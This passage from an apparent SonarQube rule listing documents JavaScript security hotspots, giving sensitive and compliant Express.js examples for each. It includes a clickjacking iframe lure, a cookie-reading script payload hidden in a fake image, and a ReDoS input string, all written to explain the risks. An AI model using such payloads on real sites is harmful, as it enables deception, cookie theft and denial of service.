const express = require('express');

let csrfProtection = csrf({ cookie: { secure: true }}); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/315">CWE-315 - Cleartext Storage of Sensitive Information in a Cookie</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/614">CWE-614 - Sensitive Cookie in HTTPS Session Without 'Secure' Attribute</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5732">
              javascript:S5732
            </a>
          </td>
          <td>
            <details>
              <p><a href="https://en.wikipedia.org/wiki/Clickjacking">Clickjacking</a> attacks occur when an attacker try to trick an user to click on certain
buttons/links of a legit website. This attack can take place with malicious HTML frames well hidden in an attacker website.</p>
<p>For instance, suppose a safe and authentic page of a social network (https://socialnetworkexample.com/makemyprofilpublic) which allows an user to
change the visibility of his profile by clicking on a button. This is a critical feature with high privacy concerns. Users are generally well informed
on the social network of the consequences of this action. An attacker can trick users, without their consent, to do this action with the below
embedded code added on a malicious website:</p>
<pre>
&lt;html&gt;
&lt;b&gt;Click on the button below to win 5000$&lt;/b&gt;
&lt;br&gt;
&lt;iframe src="https://socialnetworkexample.com/makemyprofilpublic" width="200" height="200"&gt;&lt;/iframe&gt;
&lt;/html&gt;
</pre>
<p>Playing with the size of the iframe it’s sometimes possible to display only the critical parts of a page, in this case the button of the
<em>makemyprofilpublic</em> page.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> <a href="https://en.wikipedia.org/wiki/Clickjacking#Clickjacking_categories">Critical actions</a> of the application are prone to clickjacking
  attacks because a simple click on a link or a button can trigger them. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement content security policy <em>frame-ancestors</em> directive which is supported by all modern browsers and will specify the origins of
frame allowed to be loaded by the browser (this directive deprecates <a
href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options">X-Frame-Options</a>).</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if the <a href="https://www.npmjs.com/package/helmet-csp">helmet-csp</a> or <a
href="https://www.npmjs.com/package/helmet">helmet</a> middleware is used without the <code>frameAncestors</code> directive (or if
<code>frameAncestors</code> is set to <code>'none'</code>):</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      // other directives
      frameAncestors: ["'none'"] // Sensitive: frameAncestors  is set to none
    }
  })
);
</pre>
<h2>Compliant Solution</h2>
<p>In Express.js application a standard way to implement CSP frame-ancestors directive is the <a
href="https://www.npmjs.com/package/helmet-csp">helmet-csp</a> or <a href="https://www.npmjs.com/package/helmet">helmet</a> middleware:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      // other directives
      frameAncestors: ["'example.com'"] // Compliant
    }
  })
);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html">OWASP Cheat Sheets</a> - Clickjacking Defense
  Cheat Sheet </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors">developer.mozilla.org</a> -
  Frame-ancestors </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">developer.mozilla.org</a> - Content Security Policy (CSP) </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/451">CWE-451 - User Interface (UI) Misrepresentation of Critical Information</a> </li>
  <li> <a href="https://www.w3.org/TR/CSP3/">w3.org</a> - Content Security Policy Level 3 </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5734">
              javascript:S5734
            </a>
          </td>
          <td>
            <details>
              <p><a href="https://blog.mozilla.org/security/2016/08/26/mitigating-mime-confusion-attacks-in-firefox/">MIME confusion</a> attacks occur when an
attacker successfully tricks a web-browser to interpret a resource as a different type than the one expected. To correctly interpret a resource
(script, image, stylesheet …​) web browsers look for the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type">Content-Type
header</a> defined in the HTTP response received from the server, but often this header is not set or is set with an incorrect value. To avoid
content-type mismatch and to provide the best user experience, web browsers try to deduce the right content-type, generally by inspecting the content
of the resources (the first bytes). This "guess mechanism" is called <a href="https://en.wikipedia.org/wiki/Content_sniffing">MIME type
sniffing</a>.</p>
<p>Attackers can take advantage of this feature when a website ("example.com" here) allows to upload arbitrary files. In that case, an attacker can
upload a malicious image <em>fakeimage.png</em> (containing malicious JavaScript code or <a
href="https://docs.microsoft.com/fr-fr/archive/blogs/ieinternals/script-polyglots">a polyglot content</a> file) such as:</p>
<pre>
&lt;script&gt;alert(document.cookie)&lt;/script&gt;
</pre>
<p>When the victim will visit the website showing the uploaded image, the malicious script embedded into the image will be executed by web browsers
performing MIME type sniffing.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type">Content-Type</a> header is not systematically set for all
  resources. </li>
  <li> Content of resources can be controlled by users. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options">X-Content-Type-Options</a> header with
<em>nosniff</em> value (the only existing value for this header) which is supported by all modern browsers and will prevent browsers from performing
MIME type sniffing, so that in case of Content-Type header mismatch, the resource is not interpreted. For example within a &lt;script&gt; object
context, JavaScript MIME types are expected (like <em>application/javascript</em>) in the Content-Type header.</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if, when using <a href="https://www.npmjs.com/package/helmet">helmet</a>, the <code>noSniff</code>
middleware is disabled:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();

app.use(
  helmet({
    noSniff: false, // Sensitive
  })
);
</pre>
<h2>Compliant Solution</h2>
<p>When using <code>helmet</code> in an Express.js application, the <code>noSniff</code> middleware should be enabled (it is also done by
default):</p>
<pre>
const express = require('express');
const helmet= require('helmet');

let app = express();

app.use(helmet.noSniff());
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options">developer.mozilla.org</a> - X-Content-Type-Options
  </li>
  <li> <a href="https://blog.mozilla.org/security/2016/08/26/mitigating-mime-confusion-attacks-in-firefox/">blog.mozilla.org</a> - Mitigating MIME
  Confusion Attacks in Firefox </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5852">
              javascript:S5852
            </a>
          </td>
          <td>
            <details>
              <p>Most of the regular expression engines use backtracking to try all possible execution paths of the regular expression when evaluating an input, in
some cases it can cause performance issues, called <strong>catastrophic backtracking</strong> situations. In the worst case, the complexity of the
regular expression is exponential in the size of the input, this means that a small carefully-crafted input (like 20 chars) can trigger catastrophic
backtracking and cause a denial of service of the application. Super-linear regex complexity can lead to the same impact too with, in this case, a
large carefully-crafted input (thousands chars).</p>
<p>This rule determines the runtime complexity of a regular expression and informs you if it is not linear.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The input is user-controlled. </li>
  <li> The input size is not restricted to a small number of characters. </li>
  <li> There is no timeout in place to limit the regex evaluation time. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>To avoid catastrophic backtracking situations, make sure that none of the following conditions apply to your regular expression.</p>
<p>In all of the following cases, catastrophic backtracking can only happen if the problematic part of the regex is followed by a pattern that can
fail, causing the backtracking to actually happen.</p>
<ul>
  <li> If you have a repetition <code>r*</code> or <code>r*?</code>, such that the regex <code>r</code> could produce different possible matches (of
  possibly different lengths) on the same input, the worst case matching time can be exponential. This can be the case if <code>r</code> contains
  optional parts, alternations or additional repetitions (but not if the repetition is written in such a way that there’s only one way to match it).
  </li>
  <li> If you have multiple repetitions that can match the same contents and are consecutive or are only separated by an optional separator or a
  separator that can be matched by both of the repetitions, the worst case matching time can be polynomial (O(n^c) where c is the number of
  problematic repetitions). For example <code>a*b*</code> is not a problem because <code>a*</code> and <code>b*</code> match different things and
  <code>a*_a*</code> is not a problem because the repetitions are separated by a <code>'_'</code> and can’t match that <code>'_'</code>. However,
  <code>a*a*</code> and <code>.*_.*</code> have quadratic runtime. </li>
  <li> If the regex is not anchored to the beginning of the string, quadratic runtime is especially hard to avoid because whenever a match fails, the
  regex engine will try again starting at the next index. This means that any unbounded repetition, if it’s followed by a pattern that can fail, can
  cause quadratic runtime on some inputs. For example <code>str.split(/\s*,/)</code> will run in quadratic time on strings that consist entirely of
  spaces (or at least contain large sequences of spaces, not followed by a comma). </li>
</ul>
<p>In order to rewrite your regular expression without these patterns, consider the following strategies:</p>
<ul>
  <li> If applicable, define a maximum number of expected repetitions using the bounded quantifiers, like <code>{1,5}</code> instead of <code>+</code>
  for instance. </li>
  <li> Refactor nested quantifiers to limit the number of way the inner group can be matched by the outer quantifier, for instance this nested
  quantifier situation <code>(ba+)+</code> doesn’t cause performance issues, indeed, the inner group can be matched only if there exists exactly one
  <code>b</code> char per repetition of the group. </li>
  <li> Optimize regular expressions by emulating <em>possessive quantifiers</em> and <em>atomic grouping</em>. </li>
  <li> Use negated character classes instead of <code>.</code> to exclude separators where applicable. For example the quadratic regex
  <code>.*_.*</code> can be made linear by changing it to <code>[^_]*_.*</code> </li>
</ul>
<p>Sometimes it’s not possible to rewrite the regex to be linear while still matching what you want it to match. Especially when the regex is not
anchored to the beginning of the string, for which it is quite hard to avoid quadratic runtimes. In those cases consider the following approaches:</p>
<ul>
  <li> Solve the problem without regular expressions </li>
  <li> Use an alternative non-backtracking regex implementations such as Google’s <a href="https://github.com/google/re2">RE2</a> or <a
  href="https://github.com/uhop/node-re2/">node-re2</a>. </li>
  <li> Use multiple passes. This could mean pre- and/or post-processing the string manually before/after applying the regular expression to it or
  using multiple regular expressions. One example of this would be to replace <code>str.split(/\s*,\s*/)</code> with <code>str.split(",")</code> and
  then trimming the spaces from the strings as a second step. </li>
  <li> It is often possible to make the regex infallible by making all the parts that could fail optional, which will prevent backtracking. Of course
  this means that you’ll accept more strings than intended, but this can be handled by using capturing groups to check whether the optional parts were
  matched or not and then ignoring the match if they weren’t. For example the regex <code>x*y</code> could be replaced with <code>x*(y)?</code> and
  then the call to <code>str.match(regex)</code> could be replaced with <code>matched = str.match(regex)</code> and <code>matched[1] !==
  undefined</code>. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>The regex evaluation will never end:</p>
<pre>
/(a+)+$/.test(
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+
"aaaaaaaaaaaaaaa!"
); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Possessive quantifiers do not keep backtracking positions, thus can be used, if possible, to avoid performance issues. Unfortunately, they are not
supported in JavaScript, but one can still mimick them using lookahead assertions and backreferences:</p>
<pre>
/((?=(a+))\2)+$/.test(
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+
"aaaaaaaaaaaaaaa!"
); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/400">CWE-400 - Uncontrolled Resource Consumption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1333">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>
  <li> <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">owasp.org</a> - OWASP Regular expression Denial
  of Service - ReDoS </li>
  <li> <a
  href="https://web.archive.org/web/20220506215733/https://stackstatus.net/post/147710624694/outage-postmortem-july-20-2016">stackstatus.net(archived)</a> - Outage Postmortem - July 20, 2016 </li>
  <li> <a href="https://www.regular-expressions.info/catastrophic.html">regular-expressions.info</a> - Runaway Regular Expressions: Catastrophic
  Backtracking </li>
  <li> <a
  href="https://docs.microsoft.com/en-us/dotnet/standard/base-types/backtracking-in-regular-expressions#backtracking-with-nested-optional-quantifiers">docs.microsoft.com</a> - Backtracking with Nested Optional Quantifiers </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5730">
              javascript:S5730
            </a>
          </td>
          <td>
            <details>
              <p>A mixed-content is when a resource is loaded with the HTTP protocol, from a website accessed with the HTTPs protocol, thus mixed-content are not
encrypted and exposed to <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">MITM attacks</a> and could break the entire level of
protection that was desired by implementing encryption with the HTTPs protocol.</p>
<p>The main threat with mixed-content is not only the confidentiality of resources but the whole website integrity:</p>
<ul>
  <li> A passive mixed-content (eg: <em>&lt;img src="http://example.com/picture.png"&gt;</em>) allows an attacker to access and replace only these
  resources, like images, with malicious ones that could lead to successful phishing attacks. </li>
  <li> With active mixed-content (eg: <em>&lt;script src="http://example.com/library.js"&gt;</em>) an attacker can compromise the entire website by
  injecting malicious javascript code for example (accessing and modifying the DOM, steal cookies, etc). </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The HTTPS protocol is in place and external resources are fetched from the website pages. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement content security policy <em>block-all-mixed-content</em> directive which is supported by all modern browsers and will block loading of
mixed-contents.</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if the <a href="https://www.npmjs.com/package/helmet-csp">helmet-csp</a> or <a
href="https://www.npmjs.com/package/helmet">helmet</a> middleware is used without the <code>blockAllMixedContent</code> directive:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      "default-src": ["'self'", 'example.com', 'code.jquery.com']
    } // Sensitive: blockAllMixedContent directive is missing
  })
);
</pre>
<h2>Compliant Solution</h2>
<p>In Express.js application a standard way to block mixed-content is to put in place the <a
href="https://www.npmjs.com/package/helmet-csp">helmet-csp</a> or <a href="https://www.npmjs.com/package/helmet">helmet</a> middleware with the
<code>blockAllMixedContent</code> directive:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      "default-src": ["'self'", 'example.com', 'code.jquery.com'],
      blockAllMixedContent: [] // Compliant
    }
  })
);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content">developer.mozilla.org</a> - Mixed-content </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">developer.mozilla.org</a> - Content Security Policy (CSP) </li>
  <li> <a href="https://www.w3.org/TR/CSP3/">w3.org</a> - Content Security Policy Level 3 </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5736">
              javascript:S5736
            </a>
          </td>
          <td>
            <details>
              <p><a href="https://en.wikipedia.org/wiki/HTTP_referer">HTTP header referer</a> contains a URL set by web browsers and used by applications to track
from where the user came from, it’s for instance a relevant value for web analytic services, but it can cause <a
href="https://developer.mozilla.org/en-US/docs/Web/Security/Referer_header:_privacy_and_security_concerns">serious privacy and security problems</a>
if the URL contains confidential information. Note that Firefox for instance, to prevent data leaks, <a
href="https://blog.mozilla.org/security/2018/01/31/preventing-data-leaks-by-stripping-path-information-in-http-referrers/">removes path
information</a> in the Referer header while browsing privately.</p>
<p>Suppose an e-commerce website asks the user his credit card number to purchase a product:</p>
<pre>
&lt;html&gt;
&lt;body&gt;
&lt;form action="/valid_order" method="GET"&gt;
Type your credit card number to purchase products:
&lt;input type=text id="cc" value="1111-2222-3333-4444"&gt;
&lt;input type=submit&gt;
&lt;/form&gt;
&lt;/body&gt;
</pre>
<p>When submitting the above HTML form, a HTTP GET request will be performed, the URL requested will be
https://example.com/valid_order?cc=1111-2222-3333-4444 with credit card number inside and it’s obviously not secure for these reasons:</p>
<ul>
  <li> URLs are stored in the history of browsers. </li>
  <li> URLs could be accidentally shared when doing copy/paste actions. </li>
  <li> URLs can be stolen if a malicious person looks at the computer screen of an user. </li>
</ul>
<p>In addition to these threats, when further requests will be performed from the "valid_order" page with a simple legitimate embedded script like
that:</p>
<pre>
&lt;script src="https://webanalyticservices_example.com/track"&gt;
</pre>
<p>The referer header which contains confidential information will be send to a third party web analytic service and cause privacy issue:</p>
<pre>
GET /track HTTP/2.0
Host: webanalyticservices_example.com
Referer: https://example.com/valid_order?cc=1111-2222-3333-4444
</pre>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Confidential information exists in URLs. </li>
  <li> Semantic of HTTP methods is not respected (eg: use of a GET method instead of POST when the state of the application is changed). </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Confidential information should not be set inside URLs (GET requests) of the application and a safe (ie: different from <code>unsafe-url</code> or
<code>no-referrer-when-downgrade</code>) <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy">referrer-Policy</a>
header, to control how much information is included in the referer header, should be used.</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if the <a href="https://www.npmjs.com/package/helmet">helmet</a> <code>referrerPolicy</code>
middleware is disabled or used with <code>no-referrer-when-downgrade</code> or <code>unsafe-url</code>:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

app.use(
  helmet.referrerPolicy({
    policy: 'no-referrer-when-downgrade' // Sensitive: no-referrer-when-downgrade is used
  })
);
</pre>
<h2>Compliant Solution</h2>
<p>In Express.js application a secure solution is to user the <a href="https://www.npmjs.com/package/helmet">helmet</a> referrer policy middleware set
to <code>no-referrer</code>:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();

app.use(
  helmet.referrerPolicy({
    policy: 'no-referrer' // Compliant
  })
);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy">developer.mozilla.org</a> - Referrer-Policy </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Referer_header:_privacy_and_security_concerns">developer.mozilla.org</a> -
  Referer header: privacy and security concerns </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/200">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5739">
              javascript:S5739
            </a>
          </td>
          <td>
            <details>
              <p>When implementing the HTTPS protocol, the website mostly continue to support the HTTP protocol to redirect users to HTTPS when they request a HTTP
version of the website. These redirects are not encrypted and are therefore vulnerable to man in the middle attacks. The <a
href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security">Strict-Transport-Security policy header</a> (HSTS) set by
an application instructs the web browser to convert any HTTP request to HTTPS.</p>
<p>Web browsers that see the Strict-Transport-Security policy header for the first time record information specified in the header:</p>
<ul>
  <li> the <code>max-age</code> directive which specify how long the policy should be kept on the web browser. </li>
  <li> the <code>includeSubDomains</code> optional directive which specify if the policy should apply on all sub-domains or not. </li>
  <li> the <code>preload</code> optional directive which is not part of the HSTS specification but supported on all modern web browsers. </li>
</ul>
<p>With the <code>preload</code> directive the web browser never connects in HTTP to the website and to use this directive, it is required <a
href="https://hstspreload.org/">to submit</a> the concerned application to a preload service maintained by Google.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The website is accessible with the unencrypted HTTP protocol. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement Strict-Transport-Security policy header, it is recommended to apply this policy to all subdomains (<code>includeSubDomains</code>) and
for at least 6 months (<code>max-age=15552000</code>) or even better for 1 year (<code>max-age=31536000</code>).</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if the <a href="https://www.npmjs.com/package/helmet">helmet</a> or <a
href="https://www.npmjs.com/package/hsts">hsts</a> middleware are disabled or used without recommended values:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();

app.use(helmet.hsts({
  maxAge: 3153600, // Sensitive, recommended &gt;= 15552000
  includeSubDomains: false // Sensitive, recommended 'true'
}));
</pre>
<h2>Compliant Solution</h2>
<p>In Express.js application a standard way to implement HSTS is with the <a href="https://www.npmjs.com/package/helmet">helmet</a> or <a
href="https://www.npmjs.com/package/hsts">hsts</a> middleware:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();

app.use(helmet.hsts({
  maxAge: 31536000,
  includeSubDomains: true
})); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security">developer.mozilla.org</a> - Strict Transport
  Security </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5743">
              javascript:S5743
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>By default, web browsers perform <a href="https://developer.mozilla.org/en-US/docs/Web/Performance/dns-prefetch/">DNS prefetching</a> to reduce
latency due to DNS resolutions required when an user clicks links from a website page.</p>
<p>For instance on example.com the hyperlink below contains a cross-origin domain name that must be resolved to an IP address by the web browser:</p>
<pre>
&lt;a href="https://otherexample.com"&gt;go on our partner website&lt;/a&gt;
</pre>
<p>It can add significant latency during requests, especially if the page contains many links to cross-origin domains. DNS prefetch allows web
browsers to perform DNS resolving in the background before the user clicks a link. This feature can cause privacy issues because DNS resolving from
the user’s computer is performed without his consent if he doesn’t intent to go to the linked website.</p>
<p>On a complex private webpage, a combination "of unique links/DNS resolutions" can indicate, to a eavesdropper for instance, that the user is
visiting the private page.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Links to cross-origin domains could result in leakage of confidential information about the user’s navigation/behavior of the website. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-DNS-Prefetch-Control">X-DNS-Prefetch-Control</a> header with an
<em>off</em> value but this could significantly degrade website performances.</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if the <a href="https://www.npmjs.com/package/dns-prefetch-control">dns-prefetch-control</a>
middleware is disabled or used without the recommended value:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();

app.use(
  helmet.dnsPrefetchControl({
    allow: true // Sensitive: allowing DNS prefetching is security-sensitive
  })
);
</pre>
<h2>Compliant Solution</h2>
<p>In Express.js application the <a href="https://www.npmjs.com/package/dns-prefetch-control">dns-prefetch-control</a> or <a
href="https://www.npmjs.com/package/helmet">helmet</a> middleware is the standard way to implement <code>X-DNS-Prefetch-Control</code> header:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();

app.use(
  helmet.dnsPrefetchControl({
    allow: false // Compliant
  })
);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-DNS-Prefetch-Control">developer.mozilla.org</a> - X-DNS-Prefetch-Control
  </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/Performance/dns-prefetch">developer.mozilla.org</a> - Using dns-prefetch </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S2598">
              javascript:S2598
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>If the file upload feature is implemented without proper folder restriction, it will result in an implicit trust violation within the server, as
trusted files will be implicitly stored alongside third-party files that should be considered untrusted.</p>
<p>This can allow an attacker to disrupt the security of an internal server process or the running application.</p>
<h3>What is the potential impact?</h3>
<p>After discovering this vulnerability, attackers may attempt to upload as many different file types as possible, such as javascript files, bash
scripts, malware, or malicious configuration files targeting potential processes.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Full application compromise</h4>
<p>In the worst-case scenario, the attackers succeed in uploading a file recognized by in an internal tool, triggering code execution.</p>
<p>Depending on the attacker, code execution can be used with different intentions:</p>
<ul>
  <li> Download the internal server’s data, most likely to sell it. </li>
  <li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li>
  <li> Stop services or exhaust resources, for instance, with fork bombs. </li>
</ul>
<h4>Server Resource Exhaustion</h4>
<p>By repeatedly uploading large files, an attacker can consume excessive server resources, resulting in a denial of service.</p>
<p>If the component affected by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the
denial of service can only affect the attacker who caused it.</p>
<p>Even though a denial of service might have little direct impact, it can have secondary impact in architectures that use containers and container
orchestrators. For example, it can cause unexpected container failures or overuse of resources.</p>
<p>In some cases, it is also possible to force the product to "fail open" when resources are exhausted, which means that some security features are
disabled in an emergency.</p>
<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h2>How to fix it in Formidable</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const Formidable = require('formidable');

const form          = new Formidable(); // Noncompliant
form.uploadDir      = "/tmp/";
form.keepExtensions = true;
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const Formidable = require('formidable');

const form          = new Formidable();
form.uploadDir      = "/uploads/";
form.keepExtensions = false;
</pre>
<h3>How does this work?</h3>
<h4>Use pre-approved folders</h4>
<p>Create a special folder where untrusted data should be stored. This folder should be classified as untrusted and have the following
characteristics:</p>
<ul>
  <li> It should have specific read and write permissions that belong to the right people or organizations. </li>
  <li> It should have a size limit or its size should be monitored. </li>
  <li> It should contain backup copies if it contains data that belongs to users. </li>
</ul>
<p>This folder should not be located in <code>/tmp</code>, <code>/var/tmp</code> or in the Windows directory <code>%TEMP%</code>.<br> These folders
are usually "world-writable", can be manipulated, and can be accidentally deleted by the system.</p>
<p>Also, the original file names and extensions should be changed to controlled strings to prevent unwanted code from being executed based on the file
names.</p>
<h2>Resources</h2>
<ul>
